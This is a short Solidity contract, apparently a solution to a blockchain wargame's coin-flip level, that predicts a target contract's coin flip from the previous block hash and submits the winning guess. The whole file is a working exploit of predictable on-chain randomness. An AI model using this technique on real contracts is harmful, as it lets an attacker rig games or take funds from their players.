// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { CoinFlip } from "./CoinFlip.sol";

contract CoinFlipHacker {

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public target;

    constructor(address targetAddr) {
        target = CoinFlip(targetAddr);
    }

    function guess() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return target.flip(side);
    }
}
